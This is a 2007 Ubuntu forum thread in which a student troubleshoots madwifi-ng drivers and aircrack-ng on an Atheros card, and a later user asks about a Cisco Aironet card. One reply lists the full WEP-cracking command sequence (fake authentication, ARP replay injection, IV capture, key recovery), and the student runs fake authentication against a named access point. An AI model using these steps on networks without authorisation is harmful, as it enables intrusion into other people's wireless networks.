---
title: "Madwifi-ng aircrack-ng and Feisty Fawn"
date: 2007-05-20
forum: Networking &amp; Wireless
---

### Post by Dzenhax on 2007-05-20
As part of a group project I volunteered to configure my laptop with aircrack.  I am new to Linux and this is basically a windows class, but I didn't think it would be so difficult.

So far the problem is, if I understand it right, that the madwifi drivers won't work with aircrack.  I need madwifi-ng.  There doesn't seem to be a package for that and so I'm installing from a make file.

I am running Feisty with an atheros card.  A D-link DWL-g630.  I have gone through five different tutorials and several forums and still cant get it to work.  Does anyone know of a sure fire way, or at least a better way to get aircrack-ng working on Feisty?

I read that I'm supposed to uninstall the restricted drivers, which I did, but then the new driver does not take over even after the make install is run.

My resources so far have been:

[http://hamza.khan-cheema.com/2006/12/11/atheros-wireless-setup-ubuntu](http://hamza.khan-cheema.com/2006/12/11/atheros-wireless-setup-ubuntu)

[http://www.aircrack-ng.org/doku.php?id=install_drivers#linux](http://www.aircrack-ng.org/doku.php?id=install_drivers#linux)

[http://torrez.us/myubuntu/](http://torrez.us/myubuntu/)

[http://madwifi.org/wiki/UserDocs/FirstTimeHowTo](http://madwifi.org/wiki/UserDocs/FirstTimeHowTo)

[http://ubuntuforums.org/archive/index.php/t-105437.html](http://ubuntuforums.org/archive/index.php/t-105437.html)

[http://www.askstudent.com/hacking/how-to-crack-a-wep-key-using-ubuntu/](http://www.askstudent.com/hacking/how-to-crack-a-wep-key-using-ubuntu/)

I know this can be configured on Windows, but I have really had a good time learning about Linux until now.  I'd really rather get it working on Ubuntu.

Thanks

---

### Post by tturrisi on 2007-05-20
I'm not going to read all those other threads.
Did you patch your madwifi drivers?  Aircrack-ng will not work w/ any distro's madwifi drivers [http://www.aircrack-ng.org/doku.php?id=install_drivers](http://www.aircrack-ng.org/doku.php?id=install_drivers)
they need to be patched like this:

get aircrack-ng for ubuntu:
[http://mirror.linux.org.mt/mirror/ubuntu/pool/universe/a/aircrack-ng/](http://mirror.linux.org.mt/mirror/ubuntu/pool/universe/a/aircrack-ng/)

install madwifi-ng & driver patch:
[http://www.aircrack-ng.org/doku.php?id=madwifi-ng](http://www.aircrack-ng.org/doku.php?id=madwifi-ng)

---

### Post by Dzenhax on 2007-05-20
Tturrisi,

     Thanks for that one.  That is the first set of directions that didn't give me any errors.  Still, I'm not sure I have the right driver working.  When I type in modinfo ath_pci I get:

dzenhax@Morgan:~$ modinfo ath_pci
filename:       /lib/modules/2.6.20-15-386/madwifi/ath_pci.ko
license:        Dual BSD/GPL
version:        0.9.3
description:    Support for Atheros 802.11 wireless LAN cards.
author:         Errno Consulting, Sam Leffler
srcversion:     D33427613CC54A874D9A746
alias:          pci:v0000168Cd00009013sv*sd*bc*sc*i*
alias:          pci:v0000168Cd0000001Dsv*sd*bc*sc*i*
alias:          pci:v0000168Cd0000001Csv*sd*bc*sc*i*
alias:          pci:v0000168Cd0000001Bsv*sd*bc*sc*i*
alias:          pci:v0000168Cd0000001Asv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000019sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000018sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000017sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000016sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000015sv*sd*bc*sc*i*
alias:          pci:v0000168Cd0000101Asv*sd*bc*sc*i*
alias:          pci:v0000168Cd00001014sv*sd*bc*sc*i*
alias:          pci:v000010B7d00000013sv*sd*bc*sc*i*
alias:          pci:v0000A727d00000013sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000013sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000012sv*sd*bc*sc*i*
alias:          pci:v0000168Cd00000007sv*sd*bc*sc*i*
depends:        ath_hal,wlan
vermagic:       2.6.20-15-386 mod_unload 486 
parm:           countrycode:Override default country code (int)
parm:           outdoor:Enable/disable outdoor use (int)
parm:           xchanmode:Enable/disable extended channel mode (int)
parm:           rfkill:Enable/disable RFKILL capability (int)
parm:           autocreate:Create ath device in [sta|ap|wds|adhoc|ahdemo|monitor] mode. defaults to sta, use 'none' to disable (charp)
parm:           ratectl:Rate control algorithm [amrr|onoe|sample], defaults to 'sample' (charp)
parm:           ath_debug:Load-time debug output enable (int)


I also get further errors when trying to use the software tools:

@Morgan:/home/dzenhax# airmon-ng start ath0

usage: airmon-ng <start|stop> <interface> [channel]

Interface       Chipset         Driver

wifi0           Atheros         madwifi-ng
eth1            Broadcom                bcm43xx
ath0            Atheros         madwifi-ng VAP (parent: wifi0)

@Morgan:/home/dzenhax# kismet
Server options:  none
Client options:  none
Starting server...
Waiting for server to start before starting UI...
Suid priv-dropping disabled.  This may not be secure.
No specific sources given to be enabled, all will be enabled.
Enabling channel hopping.
Enabling channel splitting.
Source 0 (madwifi): Enabling monitor mode for madwifi_ag source interface ath0 channel 6...
WARNING: ath0 appears to not accept the Madwifi-NG controls. Will attempt to configure it as a standard Madwifi-old interface. If you are using madwifi-ng, be sure to set the source interface to the wifiX control interface, NOT athX
FATAL: 'get_mode' does not return integer parameters.
@Morgan:/home/dzenhax# 

So I'm not sure if the driver is patched right or not.

---

### Post by tturrisi on 2007-05-20
do this to use aircrack-ng:

**aircrack-ng steps for ath0: -b=AP MAC and -h=card MAC**

```
airmon-ng stop ath0
airmon-ng start wifi0 11  # where 11 = the channel the ap is using
ifconfig ath1 up
aireplay-ng -1 0 -e THE-SSID -a 00:0F:B5:9F:DD:04 -h 00:11:95:69:94:F4 ath1
# where 00:0F:B5:9F:DD:04 = the mac address of the ap &
# where 00:11:95:69:94:F4 = the mac address of the adapter

# open a second term:
airodump-ng -c 11 --bssid 00:0F:B5:9F:DD:04 --ivs -w output ath1 # where 00:0F:B5:9F:DD:04 = mac address of ap

# in third term:
aireplay-ng -3 -b mac-address-of-ap -h mac-address-of-adapter ath1

# in fourth term:
aircrack-ng -b mac-address-of-ap output*.ivs
```

more info here:
[http://www.aircrack-ng.org/doku.php?id=simple_wep_crack](http://www.aircrack-ng.org/doku.php?id=simple_wep_crack)
[http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients](http://www.aircrack-ng.org/doku.php?id=how_to_crack_wep_with_no_clients)

---

### Post by Dzenhax on 2007-05-20
Thanks again.

     I think I'm on the right track.  I will post the termial session and you tell me if it looks good.  It was unsucessful, but if it's configured right and I just need to learn the tool better then I'm good with that. 

I used a wifi1 because of the wifi0 error and it didn't complain.  Hope that was OK.

root@Morgan:/home/dzenhax# airmon-ng stop ath0

usage: airmon-ng <start|stop> <interface> [channel]

Interface       Chipset         Driver

wifi0           Atheros         madwifi-ng
eth1            Broadcom                bcm43xx
ath0            Atheros         madwifi-ng VAP (parent: wifi0) (VAP destroyed)

root@Morgan:/home/dzenhax# airmon-ng start wifi0 6

usage: airmon-ng <start|stop> <interface> [channel]

Interface       Chipset         Driver

wifi0           Atheros         madwifi-ngError for wireless request "Set Frequency" (8B04) :
    SET failed on device ath0 ; No such device.

eth1            Broadcom                bcm43xx
ath1            Atheros         madwifi-ng VAP (parent: wifi0)

root@Morgan:/home/dzenhax# airmon-ng start wifi1 6

usage: airmon-ng <start|stop> <interface> [channel]

Interface       Chipset         Driver

wifi0           Atheros         madwifi-ng
eth1            Broadcom                bcm43xx
ath1            Atheros         madwifi-ng VAP (parent: wifi0)

root@Morgan:/home/dzenhax# ifconfig ath1 up
root@Morgan:/home/dzenhax# aireplay-ng -1 0 -e conclave -a 00:0B:CD:AA:D9:35 -h  00:13:46:C3:D2:4C:F8:E3 ath1
Invalid source MAC address.
root@Morgan:/home/dzenhax# aireplay-ng -1 0 -e conclave ath1
Please specify a BSSID (-a).
root@Morgan:/home/dzenhax# aireplay-ng -1 0 -e conclave -a 00:0B:CD:AA:D9:35 ath1
Please specify a source MAC (-h).
root@Morgan:/home/dzenhax# aireplay-ng -1 0 -e conclave -a 00:0B:CD:AA:D9:35 -h 00:13:46:C3:D2:4C:F8:E3 ath1
Invalid source MAC address.
root@Morgan:/home/dzenhax# aireplay-ng -1 0 -e conclave -a 00:0B:CD:AA:D9:35 -h 00:13:46:C3:D2:4C ath1
21:34:14  Sending Authentication Request
21:34:16  Sending Authentication Request
21:34:18  Sending Authentication Request
21:34:20  Sending Authentication Request
21:34:22  Sending Authentication Request
21:34:24  Sending Authentication Request
21:34:26  Sending Authentication Request

Attack was unsuccessful. Possible reasons:

    * Perhaps MAC address filtering is enabled.
    * Check that the BSSID (-a option) is correct.
    * The driver hasn't been patched for injection.
    * This attack sometimes fails against some APs.
    * The card is not on the same channel as the AP.
    * Injection is not supported AT ALL on HermesI,
      Centrino, ndiswrapper and a few others chipsets.
    * You're too far from the AP. Get closer, or lower
      the transmit rate (iwconfig <iface> rate 1M).

In case it helps here is my ifconfig.  My ath0 disappeared and I now have an ath1.  I'm guessing this is normal behavior.

dzenhax@Morgan:~$ ifconfig
ath1      Link encap:UNSPEC  HWaddr 00-13-46-C3-D2-4C-F8-E3-00-00-00-00-00-00-00-00  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:22690 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1016 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:4957263 (4.7 MiB)  TX bytes:22352 (21.8 KiB)

eth0      Link encap:Ethernet  HWaddr 00:0B:CD:8A:26:8B  
          inet addr:192.168.2.9  Bcast:192.168.2.255  Mask:255.255.255.0
          inet6 addr: fe80::20b:cdff:fe8a:268b/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:622 errors:0 dropped:0 overruns:0 frame:0
          TX packets:611 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:286798 (280.0 KiB)  TX bytes:70902 (69.2 KiB)
          Interrupt:10 Base address:0xa000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:2 errors:0 dropped:0 overruns:0 frame:0
          TX packets:2 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:100 (100.0 b)  TX bytes:100 (100.0 b)

wifi0     Link encap:UNSPEC  HWaddr 00-13-46-C3-D2-4C-00-00-00-00-00-00-00-00-00-00  
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:172205 errors:0 dropped:0 overruns:0 frame:37834
          TX packets:697 errors:0 dropped:368 overruns:0 carrier:0
          collisions:0 txqueuelen:199 
          RX bytes:3137459 (2.9 MiB)  TX bytes:22143 (21.6 KiB)
          Interrupt:11 

Thanks one more time.

---

### Post by freakout2 on 2007-07-06
whats the out put from aireplay-ng -9 eth1(your card thingy). if it out puts injection succesful you know your up and running. But to do that you need the latest version and i was on able to get it trew adept so had to do it from sorce.

---

### Post by fuzzyworbles on 2007-08-28
I am about to give up. I've tried the resources here and elsewhere and I still can't get my Cisco aironet into monitor mode. I'm running Fiesty. Any help whatsoever would be super ultra mega appreciated Here's what I've got and what the tools say:

lspci says: 
02:02.0 Network controller: AIRONET Wireless Communications Cisco Aironet Wireless 802.11b
        Subsystem: AIRONET Wireless Communications Unknown device 5000

modinfo ath_pci says:
filename:       /lib/modules/2.6.20-16-generic/net/ath_pci.ko
license:        Dual BSD/GPL
version:        svn r2667
description:    Support for Atheros 802.11 wireless LAN cards.
author:         Errno Consulting, Sam Leffler
srcversion:     91E6C579F2746B12511ECB3

.. can't create athx ...
$ wlanconfig ath0 create wlandev wifi0 wlanmode monitor
wlanconfig: ioctl: Operation not supported

.. airmon-ng doesn't recognize anything ..
$ airmon-ng 

usage: airmon-ng <start|stop> <interface> [channel]

Interface       Chipset         Driver

eth1            Unknown         Unknown (MONITOR MODE NOT SUPPORTED)

.. something else that's strange is when I choose to you airodump-ng anyway, say, on channel 11, it'll give me channel 6 and 4. If i choose channel 2, I get APs on 10 .. voodoo magic stuff like that.

A point in the right direction would be great. I've been having this problem for quite some time and haven't been able to get any help at all.

---

### Post by tturrisi on 2007-08-29
> **fuzzyworbles said:**
> I am about to give up. I've tried the resources here and elsewhere and I still can't get my Cisco aironet into monitor mode. I'm running Fiesty. Any help whatsoever would be super ultra mega appreciated Here's what I've got and what the tools say:

lspci says: 
02:02.0 Network controller: AIRONET Wireless Communications Cisco Aironet Wireless 802.11b
        Subsystem: AIRONET Wireless Communications Unknown device 5000

modinfo ath_pci says:
filename:       /lib/modules/2.6.20-16-generic/net/ath_pci.ko
license:        Dual BSD/GPL
version:        svn r2667
description:    Support for Atheros 802.11 wireless LAN cards.
author:         Errno Consulting, Sam Leffler
srcversion:     91E6C579F2746B12511ECB3

.. can't create athx ...
$ wlanconfig ath0 create wlandev wifi0 wlanmode monitor
wlanconfig: ioctl: Operation not supported

.. airmon-ng doesn't recognize anything ..
$ airmon-ng 

usage: airmon-ng <start|stop> <interface> [channel]

Interface       Chipset         Driver

eth1            Unknown         Unknown (MONITOR MODE NOT SUPPORTED)

.. something else that's strange is when I choose to you airodump-ng anyway, say, on channel 11, it'll give me channel 6 and 4. If i choose channel 2, I get APs on 10 .. voodoo magic stuff like that.

A point in the right direction would be great. I've been having this problem for quite some time and haven't been able to get any help at all.
Uh...are you certain that the Cisco card has an atheros chipset?  AFAIK there are no Aironet B cards that have the atheros chipset!  Cisco makes a B-G card with an atheros.  What model card is it?

---

### Post by fuzzyworbles on 2007-08-30
The chipset is really AIRONET then I suppose? I though that that was the module it was using or something. This explains a lot. Sorry for the foolishness. 

.. I'm left with one questions though: Why does the wildpackets driver, intended for atheros,  work under XP?

The model is as listed by lspci; [here's the wiki page for my card.]("http://www.thinkwiki.org/wiki/Cisco_Aironet_Wireless_802.11b")

Thanks for the reply.

---

